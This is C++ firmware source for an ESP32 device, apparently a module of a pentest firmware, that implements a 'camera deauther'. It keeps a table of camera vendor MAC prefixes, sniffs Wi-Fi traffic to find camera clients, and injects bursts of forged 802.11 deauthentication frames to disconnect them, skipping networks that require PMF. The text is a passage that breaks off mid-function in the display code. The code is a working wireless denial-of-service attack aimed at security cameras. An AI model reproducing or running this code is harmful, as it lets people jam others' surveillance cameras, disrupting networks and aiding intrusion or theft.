/*
 * Camera Deauther - OUI-filtered 802.11 deauth targeting for IP cameras
 * Based on doomBOX by Richard Gladson
 * https://github.com/RichardGladson/doomBOX
 * Licensed under GPL-3.0
 */

#include "camera_deauther.h"
#include "band_types.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/wifi/wifi_common.h"
#include "deauther.h"
#include <globals.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <WiFi.h>
#include <vector>

// ============================================================
// Camera OUI database
// ============================================================

struct CameraOUI {
    uint8_t prefix[3];
    const char *brand;
};

static const CameraOUI cameraOUIs[] = {
    // Hikvision
    {{0x44, 0xE9, 0x68}, "Hikvision"},
    {{0xAC, 0xCD, 0x68}, "Hikvision"},
    {{0x7C, 0x38, 0x66}, "Hikvision"},
    {{0x44, 0x47, 0xCC}, "Hikvision"},
    {{0xBC, 0xAD, 0x28}, "Hikvision"},
    {{0xC0, 0x56, 0xE3}, "Hikvision"},
    {{0x18, 0x68, 0xCB}, "Hikvision"},
    {{0x28, 0x57, 0xBE}, "Hikvision"},
    {{0x44, 0x19, 0xB6}, "Hikvision"},
    {{0x4C, 0xBD, 0x8F}, "Hikvision"},
    {{0x54, 0xC4, 0x15}, "Hikvision"},
    {{0x64, 0xDB, 0x8B}, "Hikvision"},
    {{0x94, 0xE1, 0xAC}, "Hikvision"},
    {{0xA4, 0x14, 0x37}, "Hikvision"},
    {{0xB4, 0xA3, 0x82}, "Hikvision"},
    {{0xC4, 0x2F, 0x90}, "Hikvision"},

    // Dahua
    {{0xE0, 0x41, 0x36}, "Dahua"},
    {{0x3C, 0xEF, 0x8C}, "Dahua"},
    {{0xA0, 0xBD, 0x1D}, "Dahua"},
    {{0x4C, 0x11, 0xBF}, "Dahua"},
    {{0x90, 0x02, 0xA9}, "Dahua"},
    {{0x14, 0xA7, 0x8B}, "Dahua"},
    {{0x38, 0xAF, 0x29}, "Dahua"},
    {{0xBC, 0x32, 0x5F}, "Dahua"},
    {{0xE0, 0x50, 0x8B}, "Dahua"},
    {{0x08, 0xED, 0xED}, "Dahua"},

    // Axis (enterprise/commercial)
    {{0x00, 0x40, 0x8C}, "Axis"},
    {{0xAC, 0xCC, 0x8E}, "Axis"},
    {{0xB8, 0xA4, 0x4F}, "Axis"},

    // Wyze
    {{0x30, 0xA2, 0x20}, "Wyze"},
    {{0xF0, 0x9B, 0xB8}, "Wyze"},
    {{0x94, 0x19, 0x30}, "Wyze"},
    {{0x2C, 0xAA, 0x8E}, "Wyze"},
    {{0xD0, 0x3F, 0x27}, "Wyze"},

    // Ring
    {{0xD4, 0x91, 0xAF}, "Ring"},
    {{0x34, 0xD7, 0x37}, "Ring"},
    {{0x1C, 0x96, 0x5D}, "Ring"},
    {{0x34, 0x3E, 0xA4}, "Ring"},
    {{0xAC, 0x9F, 0xC3}, "Ring"},

    // TP-Link
    {{0xB0, 0x95, 0x75}, "TP-Link"},
    {{0x50, 0xC7, 0xBF}, "TP-Link"},
    {{0xC0, 0x06, 0xC3}, "TP-Link"},
    {{0x5C, 0xA6, 0xE6}, "TP-Link"},
    {{0x60, 0xA4, 0xB7}, "TP-Link"},

    // Arlo
    {{0x20, 0x62, 0x9C}, "Arlo"},
    {{0x84, 0x24, 0x8D}, "Arlo"},
    {{0x9C, 0x3D, 0xCF}, "Arlo"},
    {{0x84, 0x25, 0x3F}, "Arlo"},

    // Amcrest
    {{0x00, 0x24, 0xE4}, "Amcrest"},
    {{0x40, 0x9F, 0x38}, "Amcrest"},

    // Lorex
    {{0x60, 0x76, 0x88}, "Lorex"},
    {{0x5C, 0x6B, 0x32}, "Lorex"},

    // Reolink
    {{0x78, 0x1F, 0x12}, "Reolink"},
    {{0xEC, 0x71, 0xFB}, "Reolink"},
    {{0xEC, 0x71, 0xDB}, "Reolink"},
    {{0xB4, 0x6D, 0x83}, "Reolink"},

    // Uniview
    {{0x88, 0x09, 0xAF}, "Uniview"},
    {{0x6C, 0xF1, 0x7E}, "Uniview"},
    {{0x48, 0xEA, 0x63}, "Uniview"},
    {{0xC4, 0x79, 0x05}, "Uniview"},
    {{0x88, 0x26, 0x3F}, "Uniview"},

    // Blink
    {{0x48, 0x2A, 0xE3}, "Blink"},
    {{0xB4, 0x69, 0x21}, "Blink"},

    // Eufy
    {{0x74, 0xCA, 0x2C}, "Eufy"},
    {{0xF4, 0x7B, 0x09}, "Eufy"},
    {{0x8C, 0x85, 0x80}, "Eufy"},
    {{0x98, 0xF1, 0x99}, "Eufy"},

    // Swann
    {{0x98, 0xE7, 0xF5}, "Swann"},

    // iSmartAlarm
    {{0xBC, 0x34, 0x00}, "iSmartAlarm"},

    // Nest
    {{0x18, 0xB4, 0x30}, "Nest"},
    {{0x64, 0x16, 0x68}, "Nest"},

    // Xiaomi (cameras share OUIs with phones/TVs; kept to the two most reliable)
    {{0x64, 0x09, 0x80}, "Xiaomi"},
    {{0x78, 0x11, 0xDC}, "Xiaomi"},

    // Tuya (subset: most-reported camera prefixes; Tuya is the white-label OEM
    // for many cheap cameras, but also for smart plugs/bulbs — full allocation
    // would cause false positives on non-camera devices)
    {{0x18, 0xDE, 0x50}, "Tuya"},
    {{0x10, 0x5A, 0x17}, "Tuya"},
    {{0x18, 0x69, 0xD8}, "Tuya"},
    {{0x1C, 0x90, 0xFF}, "Tuya"},
    {{0x4C, 0xA9, 0x19}, "Tuya"},
    {{0x50, 0x8A, 0x06}, "Tuya"},
    {{0x68, 0x57, 0x2D}, "Tuya"},
    {{0x70, 0x89, 0x76}, "Tuya"},
    {{0x7C, 0xF6, 0x66}, "Tuya"},
    {{0x84, 0xE3, 0x42}, "Tuya"},
    {{0xFC, 0x67, 0x1F}, "Tuya"},
    {{0xA0, 0x92, 0x08}, "Tuya"},
    {{0xA8, 0x80, 0x55}, "Tuya"},
    {{0xB8, 0x06, 0x0D}, "Tuya"},
    {{0xC4, 0x82, 0xE1}, "Tuya"},
    {{0xCC, 0x8C, 0xBF}, "Tuya"},
    {{0xD4, 0xA6, 0x51}, "Tuya"},
    {{0xD8, 0x1F, 0x12}, "Tuya"},
    {{0xD8, 0xD6, 0x68}, "Tuya"},
    {{0x38, 0x2C, 0xE5}, "Tuya"},
    {{0x38, 0xA5, 0xC9}, "Tuya"},
    {{0xF8, 0x17, 0x2D}, "Tuya"},
    {{0xFC, 0x3C, 0xD7}, "Tuya"},
    {{0xC0, 0xF8, 0x53}, "Tuya"},
    {{0xD8, 0xC8, 0x0C}, "Tuya"},
    {{0x3C, 0x0B, 0x59}, "Tuya"},
    {{0x80, 0x64, 0x7C}, "Tuya"},
    {{0x00, 0x33, 0x7A}, "Tuya"},
    {{0xBC, 0x35, 0x1E}, "Tuya"},
    {{0x20, 0xF1, 0xB2}, "Tuya"},
    {{0xE4, 0xAE, 0xE4}, "Tuya"},
    {{0x30, 0x48, 0x7D}, "Tuya"},
    {{0xD8, 0xFC, 0x92}, "Tuya"},

    // Commercial/enterprise (lower false-positive risk, less common at home)
    {{0x00, 0x18, 0x85}, "Avigilon"},
    {{0x00, 0x1F, 0x92}, "Avigilon"},
    {{0x00, 0x1A, 0x07}, "Arecont"},
    {{0x00, 0x01, 0x31}, "Bosch"},
    {{0x00, 0x04, 0x63}, "Bosch"},
    {{0x00, 0x10, 0x17}, "Bosch"},
    {{0x00, 0x1B, 0x86}, "Bosch"},
    {{0x00, 0x1C, 0x44}, "Bosch"},
    {{0x00, 0x07, 0x5F}, "Bosch"},
    {{0x00, 0x1B, 0xD8}, "FLIR"},
    {{0x00, 0x40, 0x7F}, "FLIR"},
    {{0x00, 0x13, 0xE2}, "Geovision"},
    {{0xE4, 0x30, 0x22}, "Hanwha"},
    {{0x00, 0x09, 0x18}, "Hanwha"},
    {{0x00, 0x0A, 0x13}, "Honeywell"},
    {{0x14, 0x2F, 0xFD}, "LTS"},
    {{0x00, 0x10, 0xBE}, "March Networks"},
    {{0x00, 0x12, 0x81}, "March Networks"},
    {{0x00, 0x03, 0xC5}, "Mobotix"},
    {{0x00, 0x04, 0x7D}, "Pelco"},
    {{0x00, 0x01, 0x4A}, "Sony"},
    {{0x00, 0x13, 0xA9}, "Sony"},
    {{0x00, 0x1A, 0x80}, "Sony"},
    {{0x00, 0x1D, 0xBA}, "Sony"},
    {{0x00, 0x24, 0xBE}, "Sony"},
};

static const int CAMERA_OUI_COUNT = sizeof(cameraOUIs) / sizeof(cameraOUIs[0]);

// ============================================================
// State
// ============================================================

#define MAX_TARGETS 16
#define MAX_AP_ENTRIES 12
#define DEAUTH_INTERVAL_MS 100
#define DEAUTH_BURST_COUNT 4
#define TARGET_STALE_MS 10000
#define DWELL_MS 1500

struct CameraTarget {
    uint8_t clientMAC[6];
    uint8_t apMAC[6];
    uint8_t ouiIndex;
    uint8_t channel;
    uint32_t lastSeenMs;
    uint16_t deauthCount;
    bool active;
};

struct APEntry {
    uint8_t mac[6];
    uint8_t channel;
    int8_t rssi;
    uint32_t lastSeenMs;
    bool pmfRequired;
};

static CameraTarget g_targets[MAX_TARGETS];
static APEntry g_aps[MAX_AP_ENTRIES];
static int g_targetCount = 0;
static int g_apCount = 0;

static std::vector<int> g_channels;
static int g_channelIndex = 0;
static int g_channel = 1;
static bool g_channelLocked = false;
static bool g_deauthActive = false;
static bool g_scanPaused = false;
static bool g_deauthAll = true;
static int g_menuCursor = 0;
static uint32_t g_lastHopMs = 0;
static uint32_t g_lastDeauthMs = 0;
static uint32_t g_totalDeauths = 0;
static uint32_t g_skippedPmf = 0;

// ============================================================
// UI delta state (reduces flicker on small/SPI screens)
// ============================================================

struct UiCache {
    bool initialized = false;
    int uiState = -1;
    int channel = -1;
    bool locked = false;
    bool deauthAll = true;
    int apCount = -1;
    int targetCount = -1;
    uint32_t totalDeauths = UINT32_MAX;
    uint32_t skippedPmf = UINT32_MAX;
    int menuCursor = -1;
    bool deauthActive = false;
    bool scanPaused = false;
    uint8_t topTargetMac[6] = {0};
};

static UiCache g_uiCache;

static void resetUiCache() {
    g_uiCache.initialized = false;
    g_uiCache.uiState = -1;
    g_uiCache.channel = -1;
    g_uiCache.locked = false;
    g_uiCache.deauthAll = true;
    g_uiCache.apCount = -1;
    g_uiCache.targetCount = -1;
    g_uiCache.totalDeauths = UINT32_MAX;
    g_uiCache.skippedPmf = UINT32_MAX;
    g_uiCache.menuCursor = -1;
    g_uiCache.deauthActive = false;
    g_uiCache.scanPaused = false;
    memset(g_uiCache.topTargetMac, 0, sizeof(g_uiCache.topTargetMac));
}

// ============================================================
// Target list & mode helpers
// ============================================================

static bool hasDeauthAllItem() {
    return g_targetCount > 1;
}

static int getTargetsListItemCount() {
    if (g_targetCount == 0) return 0;
    return g_targetCount + (hasDeauthAllItem() ? 1 : 0);
}

static void clampMenuCursor() {
    int itemCount = getTargetsListItemCount();
    if (itemCount <= 0) {
        g_menuCursor = 0;
    } else if (g_menuCursor < 0) {
        g_menuCursor = 0;
    } else if (g_menuCursor >= itemCount) {
        g_menuCursor = itemCount - 1;
    }
}

static void enableAllTargets() {
    g_deauthAll = true;
    g_channelLocked = false;
    for (int i = 0; i < g_targetCount; i++) {
        g_targets[i].active = true;
    }
}

static void lockSingleTarget(int index) {
    if (index < 0 || index >= g_targetCount) return;
    g_deauthAll = false;
    g_channelLocked = true;
    g_channel = g_targets[index].channel;
    esp_wifi_set_channel(g_channel, WIFI_SECOND_CHAN_NONE);
    for (int i = 0; i < g_targetCount; i++) {
        g_targets[i].active = (i == index);
    }
}

// ============================================================
// 802.11 helpers
// ============================================================

#pragma pack(push, 1)
struct Dot11DeauthFrame {
    uint16_t frameControl;
    uint16_t duration;
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    uint16_t seqControl;
    uint16_t reasonCode;
};
#pragma pack(pop)

static void buildDeauthFrame(Dot11DeauthFrame &frame, const uint8_t *dst, const uint8_t *src, const uint8_t *bssid) {
    memset(&frame, 0, sizeof(frame));
    frame.frameControl = 0x00C0;
    frame.duration = 0x013A;
    memcpy(frame.addr1, dst, 6);
    memcpy(frame.addr2, src, 6);
    memcpy(frame.addr3, bssid, 6);
    frame.reasonCode = 7;
}

// ============================================================
// RSN IE parser (extracts MFPC/MFPR bits from beacon/probe resp)
// ============================================================

static bool parseRsnPmfRequired(const uint8_t *frame, int frameLen) {
    int pos = 36;
    while (pos + 2 <= frameLen) {
        uint8_t tag = frame[pos];
        uint8_t tagLen = frame[pos + 1];
        if (pos + 2 + tagLen > frameLen) break;

        if (tag == 0x30 && tagLen >= 18) {
            int p = pos + 2;
            int end = p + tagLen;
            if (p + 2 + 4 + 2 > end) { pos += 2 + tagLen; continue; }
            p += 2 + 4;
            uint16_t pairwiseCount = frame[p] | (frame[p + 1] << 8);
            p += 2 + (pairwiseCount * 4);
            if (p + 2 > end) { pos += 2 + tagLen; continue; }
            uint16_t akmCount = frame[p] | (frame[p + 1] << 8);
            p += 2 + (akmCount * 4);
            if (p + 2 > end) { pos += 2 + tagLen; continue; }
            uint16_t rsnCap = frame[p] | (frame[p + 1] << 8);
            return (rsnCap & 0x0040) != 0;
        }
        pos += 2 + tagLen;
    }
    return false;
}

// ============================================================
// Channel list (band-aware)
// ============================================================

static std::vector<int> buildCameraChannelList() {
    std::vector<int> channels;
    detectSupportedBands();
    SupportedBands bands = getSupportedBands();

    if (bands.has2_4GHz) {
        for (int ch = 1; ch <= 14; ch++) channels.push_back(ch);
    }
    if (bands.has5GHz) {
        int fiveGHz[] = {36, 40, 44, 48, 149, 153, 157, 161, 165};
        for (int ch : fiveGHz) channels.push_back(ch);
    }
    if (bands.has6GHz) {
        for (int ch = 17; ch <= 233; ch += 4) channels.push_back(ch);
    }
    if (channels.empty()) channels.push_back(1);
    return channels;
}

// ============================================================
// Promiscuous sniff
// ============================================================

static int matchCameraOUI(const uint8_t *mac) {
    for (int i = 0; i < CAMERA_OUI_COUNT; i++) {
        if (memcmp(mac, cameraOUIs[i].prefix, 3) == 0) return i;
    }
    return -1;
}

static int findOrCreateAP(const uint8_t *mac, uint8_t channel, int8_t rssi, bool pmfRequired) {
    for (int i = 0; i < g_apCount; i++) {
        if (memcmp(g_aps[i].mac, mac, 6) == 0) {
            g_aps[i].channel = channel;
            g_aps[i].rssi = rssi;
            g_aps[i].lastSeenMs = millis();
            g_aps[i].pmfRequired = pmfRequired;
            return i;
        }
    }
    if (g_apCount < MAX_AP_ENTRIES) {
        memcpy(g_aps[g_apCount].mac, mac, 6);
        g_aps[g_apCount].channel = channel;
        g_aps[g_apCount].rssi = rssi;
        g_aps[g_apCount].lastSeenMs = millis();
        g_aps[g_apCount].pmfRequired = pmfRequired;
        return g_apCount++;
    }
    return -1;
}

static bool isPmfProtected(const uint8_t *apMAC) {
    for (int i = 0; i < g_apCount; i++) {
        if (memcmp(g_aps[i].mac, apMAC, 6) == 0) return g_aps[i].pmfRequired;
    }
    return false;
}

static int findOrCreateTarget(const uint8_t *clientMAC, const uint8_t *apMAC, uint8_t channel, int ouiIdx) {
    for (int i = 0; i < g_targetCount; i++) {
        if (memcmp(g_targets[i].clientMAC, clientMAC, 6) == 0) {
            memcpy(g_targets[i].apMAC, apMAC, 6);
            g_targets[i].channel = channel;
            g_targets[i].ouiIndex = (ouiIdx >= 0) ? ouiIdx : g_targets[i].ouiIndex;
            g_targets[i].lastSeenMs = millis();
            return i;
        }
    }
    if (g_targetCount < MAX_TARGETS) {
        bool hadAllItemBefore = hasDeauthAllItem();
        memcpy(g_targets[g_targetCount].clientMAC, clientMAC, 6);
        memcpy(g_targets[g_targetCount].apMAC, apMAC, 6);
        g_targets[g_targetCount].channel = channel;
        g_targets[g_targetCount].ouiIndex = (ouiIdx >= 0) ? ouiIdx : 0xFF;
        g_targets[g_targetCount].lastSeenMs = millis();
        g_targets[g_targetCount].deauthCount = 0;
        g_targets[g_targetCount].active = g_deauthAll ? true : false;
        g_targetCount++;
        g_scanPaused = false;
        if (!hadAllItemBefore && hasDeauthAllItem()) {
            g_menuCursor++;
        }
        clampMenuCursor();
        return g_targetCount - 1;
    }
    return -1;
}

static void cameraSnifferCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    uint8_t *frame = pkt->payload;
    int frameLen = pkt->rx_ctrl.sig_len;
    if (frameLen < 24) return;

    uint8_t frameType = (frame[0] >> 2) & 0x03;
    uint8_t frameSubtype = (frame[0] >> 4) & 0x0F;
    uint8_t channel = pkt->rx_ctrl.channel;
    int8_t rssi = pkt->rx_ctrl.rssi;

    uint8_t *addr1 = &frame[4];
    uint8_t *addr2 = &frame[10];
    uint8_t *addr3 = &frame[16];

    if (frameType == 0x00 && (frameSubtype == 0x08 || frameSubtype == 0x05)) {
        bool pmfReq = parseRsnPmfRequired(frame, frameLen);
        findOrCreateAP(addr3, channel, rssi, pmfReq);
        return;
    }

    int ouiA = matchCameraOUI(addr1);
    int ouiB = matchCameraOUI(addr2);

    if (ouiA >= 0) {
        const uint8_t *apMAC = (findOrCreateAP(addr2, channel, rssi, false) >= 0) ? addr2 : addr3;
        findOrCreateTarget(addr1, apMAC, channel, ouiA);
    } else if (ouiB >= 0) {
        const uint8_t *apMAC = (findOrCreateAP(addr1, channel, rssi, false) >= 0) ? addr1 : addr3;
        findOrCreateTarget(addr2, apMAC, channel, ouiB);
    }
}

// ============================================================
// Injection
// ============================================================

static void injectDeauths() {
    if (!g_deauthActive || g_targetCount == 0) return;

    uint32_t now = millis();
    if (now - g_lastDeauthMs < DEAUTH_INTERVAL_MS) return;
    g_lastDeauthMs = now;

    Dot11DeauthFrame frame;
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    for (int i = 0; i < g_targetCount; i++) {
        if (!g_targets[i].active) continue;
        if (g_targets[i].channel != g_channel) continue;

        if (isPmfProtected(g_targets[i].apMAC)) {
            g_skippedPmf++;
            continue;
        }

        buildDeauthFrame(frame, g_targets[i].clientMAC, g_targets[i].apMAC, g_targets[i].apMAC);
        for (int b = 0; b < DEAUTH_BURST_COUNT; b++) {
            wifiRawTx(WIFI_IF_STA, &frame, sizeof(frame));
        }

        buildDeauthFrame(frame, g_targets[i].apMAC, g_targets[i].clientMAC, g_targets[i].apMAC);
        for (int b = 0; b < DEAUTH_BURST_COUNT; b++) {
            wifiRawTx(WIFI_IF_STA, &frame, sizeof(frame));
        }

        buildDeauthFrame(frame, broadcast, g_targets[i].apMAC, g_targets[i].apMAC);
        wifiRawTx(WIFI_IF_STA, &frame, sizeof(frame));

        g_targets[i].deauthCount += (DEAUTH_BURST_COUNT * 2) + 1;
        g_totalDeauths += (DEAUTH_BURST_COUNT * 2) + 1;
    }
}

// ============================================================
// Channel hopping
// - SCAN mode: hop through all channels unless paused when 0 targets
// - DEAUTH all: hop through all channels (following targets)
// - DEAUTH single-target: locked to target's AP channel
// ============================================================

static void hopChannel() {
    if (g_channels.empty()) return;
    if (!g_deauthActive && g_targetCount == 0 && g_scanPaused) return;
    if (g_deauthActive && g_channelLocked) return;
    if (g_deauthActive && !g_deauthAll) return;

    uint32_t now = millis();
    if (now - g_lastHopMs < DWELL_MS) return;
    g_lastHopMs = now;

    g_channelIndex = (g_channelIndex + 1) % g_channels.size();
    g_channel = g_channels[g_channelIndex];
    esp_wifi_set_channel(g_channel, WIFI_SECOND_CHAN_NONE);
}

// ============================================================
// Target pruning
// ============================================================

static void pruneStaleTargets() {
    uint32_t now = millis();
    for (int i = g_targetCount - 1; i >= 0; i--) {
        if (now - g_targets[i].lastSeenMs > TARGET_STALE_MS) {
            bool hadAllItemBefore = hasDeauthAllItem();
            for (int j = i; j < g_targetCount - 1; j++) {
                g_targets[j] = g_targets[j + 1];
            }
            g_targetCount--;
            if (hadAllItemBefore && !hasDeauthAllItem() && g_menuCursor > 0) {
                g_menuCursor--;
            }
            clampMenuCursor();
        }
    }
}

// ============================================================
// UI helpers (responsive single-line + delta redraw)
// ============================================================

static String fitSingleLine(const String &wideText, const String &compactText) {
    int maxW = tftWidth - 16;
    if (maxW > 0 && tft.textWidth(wideText) <= maxW) {
        return wideText;
    }
    return compactText;
}

static bool hasScanUiChanged(int uiState) {
    if (!g_uiCache.initialized || g_uiCache.uiState != uiState) return true;
    if (g_uiCache.channel != g_channel || g_uiCache.locked != g_channelLocked) return true;
    if (g_uiCache.deauthAll != g_deauthAll) return true;
    if (g_uiCache.apCount != g_apCount || g_uiCache.targetCount != g_targetCount) return true;
    if (g_uiCache.totalDeauths != g_totalDeauths || g_uiCache.skippedPmf != g_skippedPmf) return true;
    if (g_uiCache.menuCursor != g_menuCursor || g_uiCache.deauthActive != g_deauthActive) return true;
    if (g_uiCache.scanPaused != g_scanPaused) return true;

    if (g_targetCount > 0) {
        if (memcmp(g_uiCache.topTargetMac, g_targets[0].clientMAC, 6) != 0) return true;
    }
    return false;
}

static void recordScanUiCache(int uiState) {
    g_uiCache.initialized = true;
    g_uiCache.uiState = uiState;
    g_uiCache.channel = g_channel;
    g_uiCache.locked = g_channelLocked;
    g_uiCache.deauthAll = g_deauthAll;
    g_uiCache.apCount = g_apCount;
    g_uiCache.targetCount = g_targetCount;
    g_uiCache.totalDeauths = g_totalDeauths;
    g_uiCache.skippedPmf = g_skippedPmf;
    g_uiCache.menuCursor = g_menuCursor;
    g_uiCache.deauthActive = g_deauthActive;
    g_uiCache.scanPaused = g_scanPaused;
    if (g_targetCount > 0) {
        memcpy(g_uiCache.topTargetMac, g_targets[0].clientMAC, 6);
    } else {
        memset(g_uiCache.topTargetMac, 0, sizeof(g_uiCache.topTargetMac));
    }
}

static int getFooterY(int lineH) {
    int footerY = tftHeight - lineH - 7;
    if (footerY < 0) footerY = 0;
    return footerY;
}

static void drawFooterLine(int x, int clearW, int lineH, const String &wideText, const String &compactText) {
    int footerY = getFooterY(lineH);
    tft.fillRect(x, footerY, clearW, lineH, bruceConfig.bgColor);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.drawString(fitSingleLine(wideText, compactText), x, footerY, 1);
}

// Badge: SCAN (green) / PAUSED (yellow) / DEAUTH (cyan)
static void drawModeBadge(int x, int y, bool deauthActive, bool scanPaused = false) {
    if (deauthActive) {
        tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
        tft.drawString("DEAUTH", x, y, 1);
    } else if (scanPaused) {
        tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
        tft.drawString("PAUSED", x, y, 1);
    } else {
        tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
        tft.drawString("SCAN", x, y, 1);
    }
}

static void drawScanScreen() {
    if (!hasScanUiChanged(0)) return;

    bool stateChanged = (!g_uiCache.initialized || g_uiCache.uiState != 0);
    if (stateChanged) {
        drawMainBorderWithTitle("CAMERA DEAUTHER");
    }

    tft.setTextSize(FP);

    int x = max(4, (int)BORDER_PAD_X + 2);
    int y = max(14, (int)BORDER_PAD_Y + FM * LH + 4);
    int lineH = max(10, FP * LH + 2);
    int clearW = max(20, tftWidth - x * 2);
    int footerY = getFooterY(lineH);

    // Line 1: Channel + mode badge (SCAN green / PAUSED yellow / DEAUTH cyan)
    if (y + lineH <= footerY) {
        tft.fillRect(x, y, clearW, lineH, bruceConfig.bgColor);
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        String chPart = "CH:" + String(g_channel) + (g_channelLocked ? "*" : "") + " ";
        tft.drawString(chPart, x, y, 1);
        bool pausedBadge = (!g_deauthActive && g_targetCount == 0 && g_scanPaused);
        drawModeBadge(x + tft.textWidth(chPart), y, g_deauthActive, pausedBadge);
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        y += lineH;
    }

    // Line 2: APs, CAMs count + targeting scope
    if (y + lineH <= footerY) {
        tft.fillRect(x, y, clearW, lineH, bruceConfig.bgColor);
        String cntWide = "AP:" + String(g_apCount) + " CAM:" + String(g_targetCount);
        String cntCompact = "A:" + String(g_apCount) + " C:" + String(g_targetCount);
        if (g_targetCount > 0) {
            const char *scope = g_deauthAll ? "ALL" : "1-TGT";
            cntWide += " [" + String(scope) + "]";
            cntCompact += " [" + String(scope) + "]";
        }
        tft.drawString(fitSingleLine(cntWide, cntCompact), x, y, 1);
        y += lineH;
    }

    // Line 3: Frames TX + PMF skipped
    if (y + lineH <= footerY) {
        tft.fillRect(x, y, clearW, lineH, bruceConfig.bgColor);
        String txWide = "TX: " + String(g_totalDeauths) + "  PMF skip: " + String(g_skippedPmf);
        String txCompact = "TX:" + String(g_totalDeauths) + " PMF:" + String(g_skippedPmf);
        tft.drawString(fitSingleLine(txWide, txCompact), x, y, 1);
        y += lineH + 2;
    }

    // Target summary
    int availListH = max(0, footerY - y - 2);
    int listLines = min(3, availListH / lineH);
    if (listLines > 0) {
        tft.fillRect(x, y, clearW, lineH * listLines, bruceConfig.bgColor);
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        if (g_targetCount == 0) {
            if (g_deauthActive) {
                tft.drawString(fitSingleLine("Waiting for targets...", "Waiting..."), x, y, 1);
            } else if (g_scanPaused) {
                tft.drawString(fitSingleLine("Scanner paused", "Paused"), x, y, 1);
            } else {
                tft.drawString(fitSingleLine("Scanning for cameras...", "Scanning..."), x, y, 1);
            }
        } else {
            for (int i = 0; i < g_targetCount && i < listLines; i++) {
                const char *brand = (g_targets[i].ouiIndex != 0xFF) ? cameraOUIs[g_targets[i].ouiIndex].brand : "Cam";
                char macShort[10];
                snprintf(macShort, sizeof(macShort), "%02X:%02X:%02X",
                         g_targets[i].clientMAC[0], g_targets[i].clientMAC[1], g_targets[i].clientMAC[2]);
                bool pmf = isPmfProtected(g_targets[i].apMAC);
                String wideEntry = String(brand) + " " + String(macShort) + " c" + String(g_targets[i].channel) + (pmf ? " [PMF]" : "");
                String compactEntry = String(brand) + " c" + String(g_targets[i].channel) + (pmf ? "*" : "");
                tft.drawString(fitSingleLine(wideEntry, compactEntry), x, y + i * lineH, 1);
            }
        }
    }

    // Footer: mode-aware and target-gated
    String wideFooter, compactFooter;
    if (!g_deauthActive) {
        if (g_targetCount > 0) {
            wideFooter = "SEL: Deauth  NXT: Targets  ESC: Exit";
            compactFooter = "SEL:Dth NXT:Tgt ESC:Ext";
        } else if (g_scanPaused) {
            wideFooter = "SEL: Resume  ESC: Exit";
            compactFooter = "SEL:Rsm ESC:Ext";
        } else {
            wideFooter = "SEL: Pause  ESC: Exit";
            compactFooter = "SEL:Pau ESC:Ext";
        }
    } else {
        wideFooter = "SEL: Scan  ESC: Back";
        compactFooter = "SEL:Scn ESC:Bck";
    }
    drawFooterLine(x, clearW, lineH, wideFooter, compactFooter);

    recordScanUiCache(0);
}

static void drawTargetsScreen() {
    if (!hasScanUiChanged(1)) return;

    bool stateChanged = (!g_uiCache.initialized || g_uiCache.uiState != 1);
    if (stateChanged) {
        drawMainBorderWithTitle("TARGETS");
    }

    clampMenuCursor();
    tft.setTextSize(FP);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);

    int x = max(4, (int)BORDER_PAD_X + 2);
    int y = max(14, (int)BORDER_PAD_Y + FM * LH + 4);
    int lineH = max(10, FP * LH + 2);
    int clearW = max(20, tftWidth - x * 2);
    int footerY = getFooterY(lineH);
    int maxRows = max(1, (footerY - y - 2) / lineH);

    tft.fillRect(x, y, clearW, maxRows * lineH, bruceConfig.bgColor);
    if (g_targetCount == 0) {
        tft.drawString("No cameras found", x, y, 1);
    } else {
        int totalItems = getTargetsListItemCount();
        int startIdx = 0;
        if (g_menuCursor >= maxRows) {
            startIdx = g_menuCursor - maxRows + 1;
        }

        int row = 0;
        for (int itemIdx = startIdx; itemIdx < totalItems && row < maxRows; itemIdx++, row++) {
            const char *cursor = (itemIdx == g_menuCursor) ? ">" : " ";
            if (hasDeauthAllItem() && itemIdx == 0) {
                String wideAll = String(cursor) + "[Deauth All] (" + String(g_targetCount) + ")";
                String compactAll = String(cursor) + "[Deauth All]";
                tft.drawString(fitSingleLine(wideAll, compactAll), x, y + row * lineH, 1);
            } else {
                int targetIdx = hasDeauthAllItem() ? (itemIdx - 1) : itemIdx;
                const char *brand = (g_targets[targetIdx].ouiIndex != 0xFF) ? cameraOUIs[g_targets[targetIdx].ouiIndex].brand : "???";
                char macShort[10];
                snprintf(macShort, sizeof(macShort), "%02X:%02X:%02X",
                         g_targets[targetIdx].clientMAC[0], g_targets[targetIdx].clientMAC[1], g_targets[targetIdx].clientMAC[2]);
                bool pmf = isPmfProtected(g_targets[targetIdx].apMAC);
                String wideRow = String(cursor) + String(brand) + " " + String(macShort) + " c" + String(g_targets[targetIdx].channel) + (pmf ? " [PMF]" : "");
                String compactRow = String(cursor) + String(brand) + " c" + String(g_targets[targetIdx].channel) + (pmf ? "*" : "");
                tft.drawString(fitSingleLine(wideRow, compactRow), x, y + row * lineH, 1);
            }
        }
    }

    int totalItems = getTargetsListItemCount();
    String wideNav = (totalItems > 1)
        ? "SEL: Confirm  PRV/NXT: Nav  ESC: Back"
        : "SEL: Confirm  ESC: Back";
    String compactNav = (totalItems > 1)
        ? "SEL:OK P/N:Nav ESC:Bk"
        : "SEL:OK ESC:Bk";
    drawFooterLine(x, clearW, lineH, wideNav, compactNav);

    recordScanUiCache(1);
}

static void drawActiveScreen() {
    if (!hasScanUiChanged(2)) return;

    bool stateChanged = (!g_uiCache.initialized || g_uiCache.uiState != 2);
    if (stateChanged) {
        drawMainBorderWithTitle(g_channelLocked ? "LOCKED" : "HOPPING");
    }

    tft.setTextSize(FP);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);

    int x = max(4, (int)BORDER_PAD_X + 2);
